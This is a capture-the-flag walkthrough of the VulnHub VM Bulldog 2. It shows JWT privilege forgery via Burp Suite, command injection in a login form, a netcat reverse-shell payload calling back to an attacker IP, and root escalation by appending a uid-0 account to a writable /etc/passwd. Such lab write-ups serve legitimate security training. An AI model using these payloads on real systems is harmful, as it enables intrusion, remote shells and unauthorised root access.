---
layout: post-detail
title: Walkthrough on the CTF Bulldog 2
date: 2018-10-23
description: CTF bulldog 2, iso at https://www.vulnhub.com/entry/bulldog-2,246/
img-url: ''
comments: true
---

# Iso

Can be found at [vulnhub](https://www.vulnhub.com/entry/bulldog-2,246/)

# Target

    $ sudo nmap -sS 192.168.2.0/24

```txt
Nmap scan report for 192.168.2.71
80/tcp open  http
```
    $ sudo nmap -sC -sV -vv -oA quick 192.168.2.71

```txt
80/tcp open  http    syn-ack ttl 64 nginx 1.14.0 (Ubuntu)
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-favicon: Unknown favicon MD5: B9AA7C338693424AAE99599BEC875B5F
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Bulldog.social
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
The site have a page:
+ /users, to view the top monthly users
+ /register, super page where we cannot register
+ /profile/\>username\<, each user have an username and an address mail

We launch `dirb` to view if we missed some paths:

```txt
+ http://192.168.2.71/default.htm%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20% (CODE:400|SIZE:2337)
```

```txt
at /var/www/node/Bulldog-2-The-Reckoning/node_modules/express/lib/router/index.js:284:7
```
We have the path of the web server `/var/www`, we see that it's a nodejs app with express.

A normal scan with dirb doesn't reveal more path.  
Nikto found somes backup file too.

```txt
+ /192.168.2.71.tar: Potentially interesting archive/cert file found.
```

    $ wget 192.168.2.71/192.168.2.71.tar
    $ file 192.168.2.71.tar
    192.168.2.71.tar: HTML document, ASCII text, with very long lines, with no line terminators
    $ strings 192.168.2.71.tar

```js
</div><br><script type="text/javascript" src="inline.7a6fe116b23fa31a9970.bundle.js"></script>
<script type="text/javascript" src="polyfills.f056ccbeb07b92448c13.bundle.js"></script>
<script type="text/javascript" src="vendor.0ce9a4a4addea27177ca.bundle.js"></script>
<script type="text/javascript" src="main.8b490782e52b9899e2a7.bundle.js"></script></body></html>
```

The last script `main.8b490782e52b9899e2a7.bundle.js` contain interesting thing.
All the code is on one line, we can use a [deobfucate js code online](https://beautifier.io/) to to read it more easily.

    $ wget 192.168.2.71/main.8b490782e52b9899e2a7.bundle.js

And paste the content on the site above. Select javascript in top left. Past the re-arrange code in a file `deobs.js` to analyze (1166 lines in all :)).

    $ vim deobs.js

So after analyze the code, i found:

A post request to create an user at `/users/register`:

```js
return l.prototype.registerUser = function(l) {
  var n = new x.Headers;
  return n.append("Content-Type", "application/json"), this.http.post("/users/register", l, {
    headers: n
```

A post request to authenticate which serve to login:

```js
, l.prototype.authenticateUser = function(l) {
    return this.http.post("/users/authenticate", l).map(function(l) {
        return l.json()
    })

```
And something about the function `isAdmin` which test the value of `master_admin_user`:

```js
l.prototype.isAdmin = function() {
  var l = localStorage.getItem("user");
    return null !== l && "master_admin_user" == JSON.parse(l).auth_level

```
We also need to know what are the required arguments to login and register.  

The function `onRegisterSubmit` need a JSON data with 4 fields: `name`, `email`, `username`, `password`:

```js
l.prototype.onRegisterSubmit = function() {
var l = this,
n = {
  name: this.name,
  email: this.email,
  username: this.username,
  password: this.password
};
```
And the function to login need a JSON data with 2 fields `username`, `password`

```js
l.prototype.onLinkLoginSubmit = function() {
var l = this,
n = {
  username: this.username,
  password: this.password
};
```

Nice, at this step, we can test the creation of user with `curl`:

    $ curl -X POST -H 'Content-Type: application/json' -d "{name:captain, email:captain@bot.co, username: captain, password: captain}" http://192.168.2.71/users/register

```txt
{"success":true,"msg":"User registered"}%
```

Go at the login page `/login`, login as captain do not change many thing :), it's just add a top bar to logout.  
So, we have to look if the site have recorder a cookie or anything others. With `F12` (chrome), go into `Application > Local Storage > http://192.168.2.71`

```txt
JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwYXlsb2FkIjp7Im5hbWUiOiJjYXB0YWluIiwiZW1haWwiOiJjYXB0YWluQGJvdC5jbyIsInVzZXJuYW1lIjoiY2FwdGFpbiIsImF1dGhfbGV2ZWwiOiJzdGFuZGFyZF91c2VyIn0sImlhdCI6MTU0MDEyOTIzNiwiZXhwIjoxNTQwNzM0MDM2fQ.dIERZ5zKXfah_JOs-AFUnFuptvIgdHafack1ipRmztQ
```

A JWT token... It's a hash that contains informations of current user. Let's check on google if we can crack them (research `crack jwt token online`).

First link [jwt.io](https://jwt.io/), pastes our hashes in the field `Encoded`.

```txt
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "payload": {
    "name": "captain",
    "email": "captain@bot.co",
    "username": "captain",
    "auth_level": "standard_user"
  },
  "iat": 1540129236,
  "exp": 1540734036
}
```

We can become an admin by replace `"auth_level": "standard_user"` by `"auth_level": "master_admin_user"`.  
Sadly, we can't change the value of JWT token into chrome. We need `burp suite` to inject this new jwt token.

To capture the jwt token in burp-suite, go to the login page:

+ `Proxy > Intercept > Raw`
+ Right Click and select:
+ `Do Intercept > Response to this request`
+ Forward

```txt
{"success":true,"token":"JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwYXlsb2FkIjp7Im5hbWUiOiJjYXB0YWluIiwiZW1haWwiOiJjYXB0YWluQGJvdC5jbyIsInVzZXJuYW1lIjoiY2FwdGFpbiIsImF1dGhfbGV2ZWwiOiJzdGFuZGFyZF91c2VyIn0sImlhdCI6MTU0MDE0NjUyNywiZXhwIjoxNTQwNzUxMzI3fQ.ftpkxIDUp8mpqnq9N561waOcPtlfrrPvdgq-HVtAfUo","user":{"name":"captain","username":"captain","email":"captain@bot.co","auth_level":"standard_user"}}
```

Now go to [jwt.io](https://jwt.io/), past this token and change the value of `"auth_level" : "master_admin_user"`.  

Before forward the request with `burp`, we modify the request.  

we replace the token by the one of `jwt.io` and change the value of `"auth_level":"master_admin_user"`.  

Forward the new request and you are an admin.  

Next, you go on the tab `admin` to look a weird formular

```txt
Please authenticate with the Link+ CLI Tool to use Link+
```
I've re-watch the file `deobs.js`, test many other obscur commands. but nothing...  
So, a bit frustate here, i look among other solutions (ya it's suck), this formular is vulnerable to an RCE (Remote Code Execution).  
I know there are the source code of this vm somewhere and the message above the formular talk about `CLI tools` but it's not a real solution to detect this type of vulnerability.  
If someone know a tool to detect this, pls let me know :)

So anyways, let's look how it work, we create an useless file and start a http server:

    $ touch useless.txt
    $ python2.7 -m SimpleHTTPServer 4444

On the form, try if it's work:

```txt
Username: ninja
Password: $(wget 192.168.2.13:4444/useless.txt)
```

Yes ! it works. We start netcat for the next attack:

    $ nc -lnvp 1234 

And test a command found on [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

```txt
Username: ninja
Password: $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.2.13 1234 >/tmp/f)
```
We are inside, now privilege escalation, we can close `burp-suite` and change the shell to `/bin/bash`:

     $ python -c 'import pty; pty.spawn("/bin/sh")'
     $ echo "$(uname -a)"

```txt
Linux bulldog2 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```

Next, i've try to search an exploit on this kernel via `linux_exploit_suggester.pl` and `searchsploit` without success.

# Escalation by /etc/passwd

To list all files world writible by all user and owned by root, enter:

    $ find / -type f -user root -perm -o=rw 2>/dev/null | grep -v /proc | grep -v /sys

We exclude `/proc` and `/sys`, finaly, the command `find` found only 1 file:.

```txt
/etc/passwd
```
Yeah, we can write into the file `/etc/passwd`, usualy, password are store under `/etc/shadow` but we can write them in `/etc/passwd`, it just not secure.

After googling a bit, i found this [post](http://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/), i'll use the perl method:

    $ perl -le 'print crypt("pass123", "abc")'
    abBxjdJQWn8xw
    $ echo 'captain:abBxjdJQWn8xw:0:0:/root/root/:/bin/bash' >> /etc/passwd
    # su captain
    Password: pass123
    # cd /root
    # cat flag.txt

```txt
Congratulations on completing this VM :D That wasn't so bad was it?

Let me know what you thought on twitter, I'm @frichette_n

I'm already working on another more challenging VM. Follow me for updates.
```

